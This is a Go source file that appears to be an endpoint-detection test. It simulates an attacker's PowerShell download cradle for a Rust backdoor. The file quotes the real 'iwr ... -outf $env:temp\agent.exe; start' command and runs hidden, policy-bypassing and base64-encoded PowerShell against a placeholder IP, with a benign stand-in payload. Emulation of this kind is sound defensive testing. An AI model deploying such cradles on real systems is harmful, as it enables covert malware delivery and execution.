//go:build windows
// +build windows

/*
STAGE 2: PowerShell Staging and Payload Retrieval (T1059.001 + T1105)
Simulates UNK_RobotDreams PowerShell download cradle that retrieves the Rust
backdoor binary from an Azure-hosted endpoint. The command pattern matches
the real attack: powershell -w hidden -c "iwr <url> -outf $env:temp\agent.exe; start ..."
This tests whether EDR detects the PowerShell-based download and execution chain.
*/

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf16"
)

const (
	TEST_UUID      = "414a4c61-019f-48ba-934d-d5e91a29a878"
	TECHNIQUE_ID   = "T1059.001"
	TECHNIQUE_NAME = "PowerShell Staging and Payload Retrieval"
	STAGE_ID       = 2
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting PowerShell staging simulation")
	LogMessage("INFO", TECHNIQUE_ID, "Simulating UNK_RobotDreams PowerShell download cradle for Rust backdoor")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "PowerShell download cradle and payload execution")

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))

		exitCode := determineExitCode(err)
		if exitCode == StageBlocked || exitCode == StageQuarantined {
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		} else {
			LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		}
		os.Exit(exitCode)
	}

	fmt.Printf("[STAGE %s] PowerShell staging simulation completed\n", TECHNIQUE_ID)
	LogMessage("SUCCESS", TECHNIQUE_ID, "PowerShell download cradle executed and simulated payload staged")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "PowerShell cradle executed, simulated Rust backdoor staged to temp")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	// UNK_RobotDreams uses PowerShell to download and execute the Rust backdoor:
	//   powershell -w hidden -c "iwr hxxps://<azure-fd>/agent.exe -outf $env:temp\agent.exe; start $env:temp\agent.exe"
	//
	// We simulate:
	// 1. Create a benign payload file (simulating the Rust backdoor binary)
	// 2. Execute PowerShell with the hidden window flag and download-like command
	// 3. The download targets localhost (safe - no actual exfiltration)
	// 4. Test whether AMSI/EDR blocks the PowerShell execution pattern

	// Step 1: Create a benign simulated Rust backdoor at a staging location
	// This represents what would be downloaded from Azure Front Door
	tempDir := os.Getenv("TEMP")
	if tempDir == "" {
		tempDir = os.Getenv("TMP")
	}
	if tempDir == "" {
		tempDir = "c:\\Windows\\Temp"
	}

	// Create simulated payload in LOG_DIR first (safe directory)
	logDir := "c:\\F0"
	if err := os.MkdirAll(logDir, 0755); err != nil {
		return fmt.Errorf("failed to create log directory: %v", err)
	}

	// The simulated "Rust backdoor" is a benign batch file
	simulatedPayload := []byte(
		"@echo off\r\n" +
			"REM F0RT1KA_SIMULATION_ARTIFACT_NOT_REAL_MALWARE\r\n" +
			"REM F0RT1KA Security Test - Simulated UNK_RobotDreams Rust backdoor\r\n" +
			"REM Real malware: Rust-based backdoor communicating via Azure Front Door\r\n" +
			"echo [F0RT1KA] Simulated Rust backdoor agent started\r\n" +
			"echo [F0RT1KA] Would establish C2 via Azure Front Door CDN\r\n" +
			"exit /b 0\r\n",
	)

	// Write payload to ARTIFACT_DIR (not whitelisted, EDR can detect)
	artifactDir := ARTIFACT_DIR
	if err := os.MkdirAll(artifactDir, 0755); err != nil {
		return fmt.Errorf("failed to create artifact directory: %v", err)
	}

	payloadPath := filepath.Join(artifactDir, "agent.exe")
	if err := os.WriteFile(payloadPath, simulatedPayload, 0755); err != nil {
		return fmt.Errorf("failed to stage simulated payload: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Simulated Rust backdoor staged at: %s (%d bytes)", payloadPath, len(simulatedPayload)))

	// Step 2: Execute PowerShell download cradle matching UNK_RobotDreams pattern
	// Uses -WindowStyle Hidden and Invoke-WebRequest pattern
	// Target is localhost to avoid actual network download, but the command pattern
	// is what matters for AMSI and EDR behavioral detection

	// First PowerShell command: hidden window download cradle (the exact TTP)
	// We use localhost URL so nothing actually downloads, but AMSI sees the pattern
	psCommand := fmt.Sprintf(
		`$ErrorActionPreference='SilentlyContinue'; `+
			`Write-Host '[F0RT1KA] Simulating UNK_RobotDreams PowerShell download cradle'; `+
			`$url='https://192.0.2.1/update/agent.exe'; `+
			`$outPath='%s'; `+
			`try { Invoke-WebRequest -Uri $url -OutFile $outPath -TimeoutSec 3 } catch { }; `+
			`if (Test-Path $outPath) { Write-Host '[F0RT1KA] Payload already staged at target path' } `+
			`else { Write-Host '[F0RT1KA] Download simulation complete (expected - no listener)' }`,
		payloadPath,
	)

	LogMessage("INFO", TECHNIQUE_ID, "Executing PowerShell download cradle with -WindowStyle Hidden flag...")
	LogMessage("INFO", TECHNIQUE_ID, "Detection opportunity: powershell.exe -w hidden -c Invoke-WebRequest")

	cmd := exec.Command("powershell.exe",
		"-WindowStyle", "Hidden",
		"-NoProfile",
		"-NonInteractive",
		"-ExecutionPolicy", "Bypass",
		"-Command", psCommand,
	)

	output, err := cmd.CombinedOutput()
	outputStr := string(output)

	if err != nil {
		// Check if this was an AMSI/EDR block
		errStr := err.Error()
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("PowerShell exit: %v", err))
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("PowerShell output: %s", strings.TrimSpace(outputStr)))

		// AMSI blocks produce specific patterns
		if strings.Contains(outputStr, "ScriptContainedMaliciousContent") ||
			strings.Contains(outputStr, "This script contains malicious content") ||
			strings.Contains(errStr, "access denied") ||
			strings.Contains(errStr, "is not recognized") {
			return fmt.Errorf("PowerShell cradle was blocked by AMSI or endpoint protection")
		}

		// If PowerShell just exited non-zero but ran, that's still useful
		// The download will fail (no listener) but AMSI should have scanned it
		LogMessage("INFO", TECHNIQUE_ID, "PowerShell executed with non-zero exit (download expected to fail)")
	} else {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("PowerShell output: %s", strings.TrimSpace(outputStr)))
	}

	// Step 3: Execute a second PowerShell pattern - Start-Process on the staged payload
	// This simulates the ";start $env:temp\agent.exe" part of the download cradle
	psStartCmd := fmt.Sprintf(
		`Write-Host '[F0RT1KA] Simulating Start-Process on staged payload'; `+
			`$agentPath='%s'; `+
			`if (Test-Path $agentPath) { `+
			`  Write-Host "[F0RT1KA] Payload found at: $agentPath"; `+
			`  Write-Host '[F0RT1KA] In real attack: Start-Process would launch Rust backdoor' `+
			`} else { `+
			`  Write-Host '[F0RT1KA] Payload not found (may have been quarantined)' `+
			`}`,
		payloadPath,
	)

	LogMessage("INFO", TECHNIQUE_ID, "Executing PowerShell Start-Process simulation...")

	cmd2 := exec.Command("powershell.exe",
		"-WindowStyle", "Hidden",
		"-NoProfile",
		"-NonInteractive",
		"-Command", psStartCmd,
	)

	output2, err2 := cmd2.CombinedOutput()
	if err2 != nil {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Start-Process simulation: %v", err2))
	} else {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Start-Process output: %s", strings.TrimSpace(string(output2))))
	}

	// Step 4: Execute base64-encoded PowerShell variant (-EncodedCommand)
	// UNK_RobotDreams often base64-encodes download cradles to evade string-based detection
	encodedScript := "New-Item -Path 'c:\\F0\\encoded_cradle_marker.txt' -ItemType File -Value 'F0RT1KA_SIMULATION_ARTIFACT' -Force"
	encodedCmd := encodePS(encodedScript)
	LogMessage("INFO", TECHNIQUE_ID, "Executing base64-encoded PowerShell command (-EncodedCommand)")
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Encoded command length: %d characters", len(encodedCmd)))

	encCmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive",
		"-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass",
		"-EncodedCommand", encodedCmd)
	encOutput, encErr := encCmd.CombinedOutput()
	if encErr != nil {
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("EncodedCommand result: %v (output: %s)", encErr, strings.TrimSpace(string(encOutput))))
	} else {
		LogMessage("INFO", TECHNIQUE_ID, "EncodedCommand PowerShell executed successfully")
	}
	LogMessage("INFO", TECHNIQUE_ID, "Detection opportunity: powershell.exe -EncodedCommand with base64-encoded download cradle")

	// Step 5: Verify artifacts survived AV/EDR scanning
	time.Sleep(3 * time.Second)

	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		return fmt.Errorf("staged payload was quarantined after PowerShell execution")
	}

	LogMessage("INFO", TECHNIQUE_ID, "Simulated Rust backdoor payload persists after PowerShell staging")
	LogMessage("INFO", TECHNIQUE_ID, "Detection points: Hidden PowerShell window, Invoke-WebRequest, ExecutionPolicy Bypass, .exe in user profile")

	return nil
}

// encodePS encodes a PowerShell script as UTF-16LE base64 for -EncodedCommand
func encodePS(script string) string {
	runes := utf16.Encode([]rune(script))
	b := make([]byte, len(runes)*2)
	for i, r := range runes {
		b[i*2] = byte(r)
		b[i*2+1] = byte(r >> 8)
	}
	return base64.StdEncoding.EncodeToString(b)
}

// ==============================================================================
// EXIT CODE DETERMINATION
// ==============================================================================

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := err.Error()
	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted", "blocked by AMSI", "blocked by endpoint"}) {
		return StageBlocked
	}
	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
		return StageQuarantined
	}
	if containsAny(errStr, []string{"not found", "does not exist", "no such", "not running", "not available"}) {
		return StageError
	}
	// Default to error (999), NOT blocked (126) - prevents false "EDR blocked" results
	return StageError
}

func containsAny(s string, substrings []string) bool {
	for _, substr := range substrings {
		if containsCI(s, substr) {
			return true
		}
	}
	return false
}

func containsCI(s, substr string) bool {
	return len(s) >= len(substr) && indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	s = toLowerStr(s)
	substr = toLowerStr(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func toLowerStr(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c = c + ('a' - 'A')
		}
		result[i] = c
	}
	return string(result)
}
